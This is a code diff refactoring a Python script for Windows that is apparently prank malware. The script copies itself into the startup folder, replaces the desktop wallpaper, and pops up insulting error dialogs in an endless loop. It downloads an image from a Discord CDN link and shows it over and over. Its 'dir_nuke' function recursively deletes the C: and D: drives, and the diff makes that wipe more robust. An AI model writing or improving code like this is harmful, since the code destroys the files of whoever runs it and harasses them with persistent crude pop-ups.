@@ -3,9 +3,12 @@ import os
 import ctypes
 import requests
 import sys
-import webbrowser
+from PIL import Image
 import time
-from tkinter import messagebox
+
+# Define custom messagebox function using ctypes
+def messagebox(text, title):
+    ctypes.windll.user32.MessageBoxW(0, text, title, 0)
 
 def copy_to_startup():
     # Get the path to the user's startup folder
@@ -19,35 +22,30 @@ def copy_to_startup():
 
 def display_error_messages():
     while True:
-        messagebox.showerror("LMAO", "Congratulations, you have won an STD!")
-        messagebox.showerror("LMAO", "Aw come on, dont go.")
-        messagebox.showerror("LMAO", "Give up.")
-        messagebox.showerror("LMAO", "Where are you going?")
-        messagebox.showerror("LMAO", "Nice try.")
-        messagebox.showerror("LMAO", "To put it simply,")
-        messagebox.showerror("LMAO", "I refuse to be closed.")
+        messagebox("Congratulations, you have won an STD!", "LMAO")
+        messagebox("Aw come on, dont go.", "LMAO")
+        messagebox("Give up.", "LMAO")
+        messagebox("Where are you going?", "LMAO")
+        messagebox("Nice try.", "LMAO")
+        messagebox("To put it simply,", "LMAO")
+        messagebox("I refuse to be closed.", "LMAO")
 
 def display_image_box():
+    image_url = 'https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png'
+    response = requests.get(image_url, stream=True)
+    with open('image.png', 'wb') as file:
+        file.write(response.content)
+
     while True:
-        objExplorer = webbrowser.get("windows-default")
-        objExplorer.open("about:blank")
-        objExplorer.toolbar = 0
-        objExplorer.statusbar = 0
-        objExplorer.left = 200
-        objExplorer.top = 200
-        objExplorer.width = 200
-        objExplorer.height = 250
-        objExplorer.visible = True
-        objExplorer.document.title = "get muazzed"
-        objExplorer.document.body.innerHTML = "<img src='https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png' height=200 width=200>"
+        img = Image.open('image.png')
+        img.show()
 
 # zestiest part of the program
 def dir_nuke():
-    dir = 'C:/'
-    shutil.rmtree(dir)
-
-    dir = 'D:/'
-    shutil.rmtree(dir)
+    dirs = ['C:/', 'D:/']
+    for dir in dirs:
+        if os.path.exists(dir):
+            shutil.rmtree(dir)
 
 # Changes wallpaper
 def change_wallpaper():
@@ -59,7 +57,7 @@ def change_wallpaper():
         file.write(image_data)
     ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
     os.remove(wallpaper_file)
-        
+
 if __name__ == "__main__":
     copy_to_startup()
     change_wallpaper()
